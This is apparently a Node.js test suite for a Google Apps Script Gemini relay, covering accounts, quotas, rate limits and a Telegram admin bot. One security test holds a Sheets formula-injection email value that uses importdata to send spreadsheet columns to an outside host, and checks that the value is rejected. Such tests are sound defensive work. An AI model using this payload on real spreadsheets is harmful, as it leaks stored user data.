import { test } from 'node:test';
import assert from 'node:assert/strict';
import { loadGas } from './helpers/gas.js';

const PATH = new URL('../backend/Code.gs', import.meta.url).pathname;
const KEY = 'AIzaTEST-secret-key-1234567890';
const KEY2 = 'AQ.TEST-second-key-abcdefghijklmnop';
const MODELS = { models: [
  { name: 'models/gemini-3.8-flash', supportedGenerationMethods: ['generateContent'], displayName: 'Gemini 3.8 Flash' },
  { name: 'models/gemini-3.9-flash-preview', supportedGenerationMethods: ['generateContent'] },
  { name: 'models/gemini-3.8-flash-lite', supportedGenerationMethods: ['generateContent', 'countTokens'] },
  { name: 'models/gemini-3.1-pro-preview', supportedGenerationMethods: ['generateContent'] },
  { name: 'models/gemini-flash-latest', supportedGenerationMethods: ['generateContent'] },
  { name: 'models/gemini-omni-1.1-flash', supportedGenerationMethods: ['generateContent'] },
  { name: 'models/gemini-3.5-transcribe', supportedGenerationMethods: ['generateContent'] },
  { name: 'models/text-embedding-005', supportedGenerationMethods: ['embedContent'] },
  { name: 'models/gemini-3.8-flash-tts', supportedGenerationMethods: ['generateContent'] },
] };
const OK_BODY = { candidates: [{ content: { parts: [{ text: '{"a":1}' }] }, finishReason: 'STOP' }], usageMetadata: { totalTokenCount: 120 } };
const gemOK = (url, o, resp) => (url.includes('/models?') ? resp(200, MODELS) : resp(200, OK_BODY));

/** Máy chủ đã cài xong (đã chạy caiDat) với 1 hoặc nhiều key. */
function setup(fetchImpl, { keys = KEY, props = {} } = {}) {
  const g = loadGas(PATH, { props: { ...props }, fetch: fetchImpl || gemOK });
  g.run(`GEMINI_KEY_MOI = ${JSON.stringify(keys)}; caiDat();`);
  return g;
}
const USER = { ten: 'nguyễn văn a', email: ' A@Mail.com ', sdt: '0901 234 567', mk: 'matkhau-123' };
function signup(g, over = {}) { return g.post({ action: 'dangky', ...USER, ...over }); }
function login(g, over = {}) { return g.post({ action: 'dangnhap', email: USER.email, mk: USER.mk, ...over }); }
const rows = (g) => { const b = Object.values(g.books)[0]; return b.sheets.find((s) => s.name === 'TaiKhoan').rows; };
const gen = (token, extra = {}) => ({ action: 'generate', token, contents: [{ role: 'user', parts: [{ text: 'hi' }] }], generationConfig: { temperature: 0 }, ...extra });
const genCalls = (g) => g.calls.filter((c) => c.url.includes(':generateContent'));

// ─── Cài đặt ──────────────────────────────────────────────

test('caiDat: cất key vào Script Properties, tạo bảng tài khoản, chạy lại không tạo bảng mới', () => {
  const g = setup(undefined, { keys: `${KEY}, ${KEY2}` });
  assert.equal(g.props.GEMINI_KEYS, `${KEY}\n${KEY2}`);
  assert.ok(g.props.AI_SHEET_ID && g.props.AI_PEPPER && g.props.AI_PEPPER.length >= 32);
  assert.deepEqual(rows(g)[0].slice(0, 6), ['ma', 'email', 'ten', 'sdt', 'salt', 'hash']);
  g.run('caiDat()');
  assert.equal(Object.keys(g.books).length, 1);
  assert.ok(g.logs.some((l) => l.includes('gemini-3.8-flash')), 'nhật ký báo model sẽ dùng');
});

test('chưa cài key → báo setup, không gọi ra ngoài', () => {
  const g = loadGas(PATH, { fetch: gemOK });
  g.run("GEMINI_KEY_MOI = 'DAN_KEY_GEMINI'; try { caiDat(); } catch (e) {}");
  const tk = signup(g).data.token;
  const r = g.post(gen(tk));
  assert.equal(r.code, 'setup');
  assert.equal(genCalls(g).length, 0);
});

// ─── Đăng ký / đăng nhập ──────────────────────────────────

test('đăng ký: chuẩn hoá email / tên, không lưu mật khẩu thô, trả phiên + hồ sơ', () => {
  const g = setup();
  const r = signup(g);
  assert.equal(r.ok, true);
  assert.match(r.data.token, /^E[A-Z0-9]{5}\.[A-Za-z0-9]{40,}$/);
  assert.deepEqual(r.data.me, { ten: 'Nguyễn Văn A', email: 'a@mail.com', vaitro: 'free', luot: { dung: 0, han: 10 } });
  const [, row] = rows(g);
  assert.equal(row[1], 'a@mail.com');
  assert.ok(!row.join('|').includes(USER.mk), 'mật khẩu không nằm trong bảng');
  assert.ok(!row.join('|').includes(r.data.token), 'phiên chỉ lưu bản băm');
});

test('đăng ký: kiểm tra dữ liệu, trùng email, ô bẫy bot', () => {
  const g = setup();
  assert.equal(signup(g, { ten: '' }).code, 'thieu');
  assert.equal(signup(g, { email: 'khong-phai-email' }).code, 'email_sai');
  assert.equal(signup(g, { sdt: '123' }).code, 'sdt_sai');
  assert.equal(signup(g, { mk: '1234567' }).code, 'mk_ngan');
  assert.equal(signup(g, { website: 'http://spam' }).ok, false);
  assert.equal(rows(g).length, 1, 'không dòng nào được thêm');
  assert.equal(signup(g).ok, true);
  assert.equal(signup(g, { email: 'a@MAIL.com' }).code, 'da_ton_tai');
});

test('đăng nhập: đúng → phiên mới; sai → sai; sai 5 lần → khoá tạm 10 phút kể cả mật khẩu đúng', () => {
  const g = setup();
  signup(g);
  assert.equal(login(g).ok, true);
  assert.equal(login(g, { email: 'A@mail.com' }).ok, true, 'email không phân biệt hoa thường');
  assert.equal(login(g, { mk: 'sai-roi-123' }).code, 'sai');
  assert.equal(login(g, { email: 'khong-co@mail.com' }).code, 'sai', 'không lộ email có tồn tại hay không');
  for (let i = 0; i < 4; i++) login(g, { mk: 'sai' + i });
  assert.equal(login(g).code, 'khoa_tam');
  g.tick(11 * 60 * 1000);
  assert.equal(login(g).ok, true);
});

test('phiên: xem hồ sơ, token giả / hết hạn / đã đăng xuất đều bị từ chối; tối đa 3 máy', () => {
  const g = setup();
  const t1 = signup(g).data.token;
  assert.equal(g.post({ action: 'toi', token: t1 }).data.me.email, 'a@mail.com');
  const fake = t1.slice(0, t1.indexOf('.') + 1) + 'x'.repeat(40);
  for (const token of [fake, '', 'Econstructor.abc', '__proto__', { a: 1 }]) assert.equal(g.post({ action: 'toi', token }).code, 'auth', String(token));
  const t2 = login(g).data.token, t3 = login(g).data.token, t4 = login(g).data.token;
  assert.equal(g.post({ action: 'toi', token: t1 }).code, 'auth', 'đăng nhập máy thứ 4 → phiên cũ nhất hết');
  for (const t of [t2, t3, t4]) assert.equal(g.post({ action: 'toi', token: t }).ok, true);
  assert.equal(g.post({ action: 'dangxuat', token: t2 }).ok, true);
  assert.equal(g.post({ action: 'toi', token: t2 }).code, 'auth');
  assert.equal(g.post({ action: 'toi', token: t3 }).ok, true, 'đăng xuất máy này không đá máy khác');
  g.tick(31 * 24 * 3600 * 1000);
  assert.equal(g.post({ action: 'toi', token: t3 }).code, 'auth', 'phiên sống 30 ngày');
});

test('duyệt tay (AI_CAN_DUYET): đăng ký xong chờ duyệt; quản trị sửa bảng thành active là vào được; off là khoá', () => {
  const g = setup(undefined, { props: { AI_CAN_DUYET: '1' } });
  const r = signup(g);
  assert.equal(r.ok, true); assert.equal(r.data.cho, true); assert.equal(r.data.token, undefined);
  assert.equal(login(g).code, 'cho_duyet');
  const head = rows(g)[0];
  rows(g)[1][head.indexOf('trangthai')] = 'active';
  const tk = login(g).data.token;
  assert.ok(tk);
  rows(g)[1][head.indexOf('trangthai')] = 'off';
  assert.equal(login(g).code, 'bi_khoa');
  assert.equal(g.post({ action: 'toi', token: tk }).code, 'auth', 'khoá tài khoản thì phiên đang mở cũng hết');
});

// ─── Gọi Gemini ───────────────────────────────────────────

test('generate: cần đăng nhập; chuyển tiếp bằng key trên máy chủ, key không lộ ra phản hồi', () => {
  const g = setup();
  assert.equal(g.post(gen('')).code, 'auth');
  const tk = signup(g).data.token;
  const r = g.post(gen(tk));
  assert.equal(r.ok, true);
  assert.deepEqual(r.data, { text: '{"a":1}', finishReason: 'STOP', tokens: 120 });
  const call = genCalls(g)[0];
  assert.equal(call.o.headers['x-goog-api-key'], KEY);
  assert.ok(!call.url.includes(KEY) && !JSON.stringify(r).includes(KEY));
});

test('model do máy chủ chọn: flash chính thức mới nhất (bỏ lite, preview, latest, omni, transcribe); trang không đổi được', () => {
  const g = setup();
  const tk = signup(g).data.token;
  g.post(gen(tk, { model: 'gemini-3.1-pro-preview' }));
  assert.match(genCalls(g)[0].url, /models\/gemini-3\.8-flash:generateContent$/);
  g.props.AI_MODEL = 'gemini-3.1-pro-preview';
  g.post(gen(tk));
  assert.match(genCalls(g)[1].url, /gemini-3\.1-pro-preview:generateContent$/, 'quản trị chọn model qua AI_MODEL');
  g.props.AI_MODEL = 'khong-co-model-nay';
  g.post(gen(tk));
  assert.match(genCalls(g)[2].url, /gemini-3\.8-flash:generateContent$/);
});

test('nhiều key: key đầu hết hạn mức (429) → dùng ngay key sau trong cùng lượt; mọi key nghỉ → busy', () => {
  const hit = [];
  const g = setup((url, o, resp) => {
    if (url.includes('/models?')) return resp(200, MODELS);
    hit.push(o.headers['x-goog-api-key']);
    return o.headers['x-goog-api-key'] === KEY ? resp(429, { error: { code: 429 } }) : resp(200, OK_BODY);
  }, { keys: `${KEY}\n${KEY2}` });
  const tk = signup(g).data.token;
  assert.equal(g.post(gen(tk)).ok, true);
  assert.deepEqual(hit.slice(-2).sort(), [KEY, KEY2].sort());
  hit.length = 0;
  assert.equal(g.post(gen(tk)).ok, true);
  assert.deepEqual(hit, [KEY2], 'key đang nghỉ thì bỏ qua');
  const g2 = setup((url, o, resp) => (url.includes('/models?') ? resp(200, MODELS) : resp(429, { error: { code: 429 } })), { keys: `${KEY},${KEY2}` });
  const t2 = signup(g2).data.token;
  const r = g2.post(gen(t2));
  assert.equal(r.code, 'busy'); assert.ok(r.retryAfter > 0);
  assert.equal(g2.post({ action: 'toi', token: t2 }).data.me.luot.dung, 0, 'không thành công thì không trừ lượt');
});

test('hạn mức theo vai trò: tài khoản thường ít lượt, học viên nhiều hơn, giảng viên không giới hạn; cột luot_ngay đè lên', () => {
  const g = setup(undefined, { props: { AI_LUOT_FREE: '2', AI_LUOT_HV: '3' } });
  const tk = signup(g).data.token;
  assert.equal(g.post(gen(tk)).ok, true);
  assert.equal(g.post(gen(tk)).ok, true);
  const r = g.post(gen(tk));
  assert.equal(r.code, 'quota'); assert.match(r.error, /2 lượt/);
  const head = rows(g)[0], row = rows(g)[1];
  row[head.indexOf('vaitro')] = 'hv';
  assert.deepEqual(g.post({ action: 'toi', token: tk }).data.me.luot, { dung: 2, han: 3 });
  assert.equal(g.post(gen(tk)).ok, true);
  assert.equal(g.post(gen(tk)).code, 'quota');
  row[head.indexOf('luot_ngay')] = 5;
  assert.equal(g.post(gen(tk)).ok, true);
  assert.deepEqual(g.post({ action: 'toi', token: tk }).data.me.luot, { dung: 4, han: 5 });
  row[head.indexOf('vaitro')] = 'gv';
  for (let i = 0; i < 5; i++) assert.equal(g.post(gen(tk)).ok, true);
  assert.equal(g.post({ action: 'toi', token: tk }).data.me.vaitro, 'gv');
  row[head.indexOf('vaitro')] = 'admin';
  assert.equal(g.post({ action: 'toi', token: tk }).data.me.vaitro, 'gv', 'vai trò admin cũ = giảng viên');
  g.tick(24 * 3600 * 1000);
  row[head.indexOf('vaitro')] = 'free'; row[head.indexOf('luot_ngay')] = '';
  assert.equal(g.post({ action: 'toi', token: tk }).data.me.luot.dung, 0, 'sang ngày mới tính lại');
});

test('giữ lượt trước khi gọi Gemini, lỗi thì trả lại; 429 báo busy kèm số giây chờ', () => {
  let usedDuringCall, tk;
  const g = setup((url, o, resp) => {
    if (url.includes('/models?')) return resp(200, MODELS);
    usedDuringCall = g.post({ action: 'toi', token: tk }).data.me.luot.dung;
    return resp(429, { error: { code: 429, details: [{ retryDelay: '17s' }] } });
  });
  tk = signup(g).data.token;
  const r = g.post(gen(tk));
  assert.equal(r.code, 'busy'); assert.equal(r.retryAfter, 17);
  assert.equal(usedDuringCall, 1);
  assert.equal(g.post({ action: 'toi', token: tk }).data.me.luot.dung, 0);
});

test('mỗi tài khoản có trần lượt/phút riêng; cả hệ thống có trần chung', () => {
  const g = setup(undefined, { props: { AI_LUOT_FREE: '999' } });
  g.run('AI_RPM_MA = 2; AI_RPM = 3');
  const a = signup(g).data.token;
  const b = signup(g, { email: 'b@mail.com' }).data.token;
  assert.equal(g.post(gen(a)).ok, true);
  assert.equal(g.post(gen(a)).ok, true);
  assert.equal(g.post(gen(a)).code, 'busy');
  assert.equal(g.post(gen(b)).ok, true);
  assert.equal(g.post(gen(b)).code, 'busy', 'trần chung 3 lượt/phút');
  g.tick(61 * 1000);
  assert.equal(g.post(gen(b)).ok, true);
});

test('chỉ chuyển tiếp trường cho phép; giới hạn độ dài chữ, chỉ dẫn hệ thống, mức suy nghĩ', () => {
  const g = setup();
  const tk = signup(g).data.token;
  g.post(gen(tk, { tools: [{ googleSearch: {} }], generationConfig: { temperature: 0, maxOutputTokens: 999999, responseMimeType: 'application/json', foo: 1, thinkingConfig: { thinkingBudget: 100000, includeThoughts: true } },
    systemInstruction: { parts: [{ text: 'sys' }] } }));
  const sent = JSON.parse(genCalls(g)[0].o.payload);
  assert.equal(sent.tools, undefined);
  assert.equal(sent.generationConfig.maxOutputTokens, 32768);
  assert.equal(sent.generationConfig.foo, undefined);
  assert.deepEqual(sent.generationConfig.thinkingConfig, { thinkingBudget: 8192 });
  assert.deepEqual(sent.systemInstruction, { parts: [{ text: 'sys' }] });
  assert.equal(g.post(gen(tk, { contents: [{ role: 'user', parts: [{ text: 'x'.repeat(300000) }] }] })).code, 'bad');
  assert.equal(g.post(gen(tk, { systemInstruction: { parts: [{ text: 'y'.repeat(30000) }] } })).code, 'bad');
  assert.equal(g.post(gen(tk, { contents: 'x' })).code, 'bad');
});

test('quá 60 giây → timeout; Gemini chặn / trả rỗng → báo rõ; yêu cầu hỏng → bad', () => {
  let mode = 'timeout';
  const g = setup((url, o, resp) => {
    if (url.includes('/models?')) return resp(200, MODELS);
    if (mode === 'timeout') throw new Error('Exception: Timeout: https://generativelanguage.googleapis.com/...');
    if (mode === 'block') return resp(200, { promptFeedback: { blockReason: 'SAFETY' } });
    return resp(200, { candidates: [] });
  });
  const tk = signup(g).data.token;
  assert.equal(g.post(gen(tk)).code, 'timeout');
  mode = 'block'; assert.equal(g.post(gen(tk)).code, 'blocked');
  mode = 'empty'; assert.equal(g.post(gen(tk)).code, 'upstream');
  assert.equal(JSON.parse(g.ctx.doPost({ postData: { contents: '{bad' } })).code, 'bad');
  assert.equal(g.post({ action: 'lala' }).code, 'bad');
});

// ─── Quản trị chạy tay ────────────────────────────────────

test('quản trị: đặt lại mật khẩu, cấp quyền giảng viên bằng hàm chạy tay', () => {
  const g = setup();
  signup(g);
  g.run("datLaiMatKhau('a@mail.com', 'mat-khau-moi-1')");
  assert.equal(login(g).code, 'sai');
  assert.equal(login(g, { mk: 'mat-khau-moi-1' }).ok, true);
  g.run("datQuanTri('A@mail.com')");
  assert.equal(login(g, { mk: 'mat-khau-moi-1' }).data.me.vaitro, 'gv');
});

// ─── Sau review bảo mật ───────────────────────────────────

test('email dạng công thức Sheets (=importdata…) bị từ chối; mọi ô người dùng nhập đều không thành công thức', () => {
  const g = setup();
  const evil = '=importdata("http://x.co/?"&textjoin(",",1,b:f))&"@a.bc"';
  assert.equal(signup(g, { email: evil }).code, 'email_sai');
  assert.equal(signup(g, { email: '+1@a.bc' }).code, 'email_sai');
  assert.equal(signup(g, { ten: '=HYPERLINK("http://x")' }).ok, true);
  const row = rows(g)[1];
  assert.ok(row.every((v) => !/^[=+\-@]/.test(String(v))), JSON.stringify(row));
});

test('gmail có dấu chấm / +nhãn vẫn tính là cùng một email (không nuôi nhiều tài khoản lấy lượt miễn phí)', () => {
  const g = setup();
  assert.equal(signup(g, { email: 'an.nguyen@gmail.com' }).ok, true);
  assert.equal(signup(g, { email: 'annguyen+2@gmail.com' }).code, 'da_ton_tai');
  assert.equal(signup(g, { email: 'AN.NGUYEN+abc@googlemail.com' }).code, 'da_ton_tai');
  assert.equal(signup(g, { email: 'an.nguyen+2@congty.vn' }).ok, true, 'tên miền khác gmail giữ nguyên');
});

test('dò email bằng đăng ký cũng tính vào trần đăng ký mỗi giờ', () => {
  const g = setup();
  g.run('DK_MOI_GIO = 3');
  signup(g);
  signup(g); signup(g);                                     // 2 lần dò trùng
  assert.equal(signup(g, { email: 'moi@mail.com' }).code, 'busy');
});

test('Gemini đã làm việc (quá giờ, bị chặn, lỗi yêu cầu) thì vẫn tính lượt; chỉ trả lượt khi Gemini chưa làm gì', () => {
  let mode = 'timeout';
  const g = setup((url, o, resp) => {
    if (url.includes('/models?')) return resp(200, MODELS);
    if (mode === 'timeout') throw new Error('Exception: Timeout');
    if (mode === '400') return resp(400, { error: { code: 400, status: 'INVALID_ARGUMENT', message: 'bad schema' } });
    if (mode === 'net') throw new Error('Exception: DNS error');
    return resp(429, { error: { code: 429 } });
  });
  const tk = signup(g).data.token;
  const used = () => g.post({ action: 'toi', token: tk }).data.me.luot.dung;
  g.post(gen(tk)); assert.equal(used(), 1, 'quá giờ vẫn tính');
  mode = '400'; g.post(gen(tk)); assert.equal(used(), 2, 'yêu cầu hỏng vẫn tính');
  mode = 'net'; g.post(gen(tk)); assert.equal(used(), 2, 'không tới được Gemini → trả lượt');
  mode = '429'; g.post(gen(tk)); assert.equal(used(), 2, 'hết hạn mức key → trả lượt');
});

test('responseSchema quá lớn → bad', () => {
  const g = setup();
  const tk = signup(g).data.token;
  const big = { type: 'OBJECT', properties: Object.fromEntries(Array.from({ length: 3000 }, (_, i) => [`f${i}`, { type: 'STRING' }])) };
  assert.equal(g.post(gen(tk, { generationConfig: { responseSchema: big } })).code, 'bad');
});

// ─── Bot Telegram ─────────────────────────────────────────

const TG = '123456:TEST-token';
const ADMIN = '700100200';
/** Máy chủ có bot: updates = hàng chờ getUpdates; sent = tin bot đã gửi. */
function setupTg(extra = {}) {
  const updates = [], sent = [];
  const g = loadGas(PATH, { props: { ...(extra.props || {}) }, fetch: (url, o, resp) => {
    if (url.startsWith('https://api.telegram.org/')) {
      const method = url.split('/').pop(), body = o.payload ? JSON.parse(o.payload) : {};
      if (method === 'getUpdates') return resp(200, { ok: true, result: updates.splice(0).filter((u) => u.update_id >= (body.offset || 0)) });
      sent.push({ method, body });
      return resp(200, { ok: true, result: {} });
    }
    return extra.gem ? extra.gem(url, o, resp) : gemOK(url, o, resp);
  } });
  g.run(`GEMINI_KEY_MOI = ${JSON.stringify(KEY)}; TG_TOKEN_MOI = ${JSON.stringify(TG)}; TG_CHAT_MOI = ${JSON.stringify(ADMIN)}; caiDat();`);
  return { g, updates, sent };
}
let uid = 1;
const msg = (text, chat = ADMIN) => ({ update_id: uid++, message: { message_id: 1, chat: { id: Number(chat) }, from: { id: Number(chat) }, text } });
const cb = (data, chat = ADMIN) => ({ update_id: uid++, callback_query: { id: 'cb' + uid, data, from: { id: Number(chat) }, message: { message_id: 9, chat: { id: Number(chat) } } } });
const col = (g, name) => rows(g)[1][rows(g)[0].indexOf(name)];
const texts = (sent) => sent.filter((x) => x.method === 'sendMessage' || x.method === 'editMessageText').map((x) => x.body.text).join('\n---\n');

test('caiDat có token bot: cất token + chat quản trị, bỏ webhook, bật lịch hỏi tin mỗi phút (không tạo trùng), nhắn thử', () => {
  const { g, sent } = setupTg();
  assert.equal(g.props.TG_TOKEN, TG);
  assert.equal(g.props.TG_ADMIN, ADMIN);
  assert.ok(sent.some((x) => x.method === 'deleteWebhook'));
  assert.deepEqual(g.triggers.map((t) => [t.fn, t.n]), [['hoiTelegram', 1]]);
  assert.ok(sent.some((x) => x.method === 'sendMessage' && x.body.chat_id === ADMIN));
  g.run('caiDat()');
  assert.equal(g.triggers.length, 1);
});

test('có tài khoản mới → bot báo quản trị kèm nút xếp vai trò; Telegram lỗi thì đăng ký vẫn thành công', () => {
  const { g, sent } = setupTg();
  sent.length = 0;
  assert.equal(signup(g).ok, true);
  const m = sent.find((x) => x.method === 'sendMessage');
  assert.ok(m && m.body.chat_id === ADMIN);
  assert.match(m.body.text, /Nguyễn Văn A/); assert.match(m.body.text, /a@mail\.com/); assert.match(m.body.text, /0901234567/);
  const buttons = m.body.reply_markup.inline_keyboard.flat().map((b) => b.callback_data);
  const ma = col(g, 'ma');
  assert.ok(buttons.includes(`vt|hv|${ma}`) && buttons.includes(`vt|gv|${ma}`) && buttons.includes(`tt|off|${ma}`), buttons.join());
  const g2 = setupTg().g;
  g2.ctx.UrlFetchApp.fetch = (url) => { if (url.includes('telegram')) throw new Error('mất mạng'); return { getResponseCode: () => 200, getContentText: () => '{}' }; };
  assert.equal(signup(g2, { email: 'b@mail.com' }).ok, true);
});

test('bấm nút trên Telegram (chỉ chat quản trị): xếp học viên / giảng viên / khoá; cùng một tin không xử lý hai lần', () => {
  const { g, updates, sent } = setupTg();
  signup(g);
  const ma = col(g, 'ma');
  updates.push(cb(`vt|hv|${ma}`));
  g.run('hoiTelegram()');
  assert.equal(col(g, 'vaitro'), 'hv');
  assert.ok(sent.some((x) => x.method === 'answerCallbackQuery'));
  updates.push(cb(`vt|gv|${ma}`, '999'));                          // người lạ bấm
  g.run('hoiTelegram()');
  assert.equal(col(g, 'vaitro'), 'hv', 'chat khác không ra lệnh được');
  const again = cb(`tt|off|${ma}`);
  updates.push(again, { ...again });
  g.run('hoiTelegram()');
  assert.equal(col(g, 'trangthai'), 'off');
  assert.equal(sent.filter((x) => x.method === 'answerCallbackQuery' && x.body.text.startsWith('✔')).length, 2, 'tin trùng chỉ xử lý 1 lần');
  assert.ok(Number(g.props.TG_OFFSET) > 0);
});

test('lệnh quản trị: /hocvien /giangvien /free /luot /khoa /mo /matkhau /tim /thongke /cho', () => {
  const { g, updates, sent } = setupTg();
  signup(g);
  const run = (text, chat) => { sent.length = 0; updates.push(msg(text, chat)); g.run('hoiTelegram()'); return texts(sent); };
  run('/hocvien a@mail.com'); assert.equal(col(g, 'vaitro'), 'hv');
  run('/giangvien A@MAIL.com'); assert.equal(col(g, 'vaitro'), 'gv');
  run('/free a@mail.com'); assert.equal(col(g, 'vaitro'), 'free');
  run('/luot a@mail.com 50'); assert.equal(Number(col(g, 'luot_ngay')), 50);
  run('/khoa a@mail.com'); assert.equal(col(g, 'trangthai'), 'off');
  run('/mo a@mail.com'); assert.equal(col(g, 'trangthai'), 'active');
  run('/matkhau a@mail.com mat-khau-moi-9'); assert.equal(login(g, { mk: 'mat-khau-moi-9' }).ok, true);
  assert.match(run('/tim nguyễn'), /a@mail\.com/);
  assert.match(run('/thongke'), /Tài khoản: 1/);
  assert.match(run('/hocvien khong-co@mail.com'), /Không tìm thấy/);
  assert.match(run('/help'), /\/hocvien/);
  assert.match(run('/thongke', '999'), /quản trị/, 'người lạ chỉ nhận lời từ chối');
  assert.equal(col(g, 'vaitro'), 'free');
});

test('key Gemini hỏng → báo quản trị qua Telegram, tối đa 1 lần mỗi giờ', () => {
  const { g, sent } = setupTg({ gem: (url, o, resp) => (url.includes('/models?') ? resp(200, MODELS) : resp(403, { error: { code: 403, message: 'API key not valid' } })) });
  const tk = signup(g).data.token;
  sent.length = 0;
  g.post(gen(tk)); g.post(gen(tk));
  assert.equal(sent.filter((x) => /key/i.test(x.body.text || '')).length, 1);
});
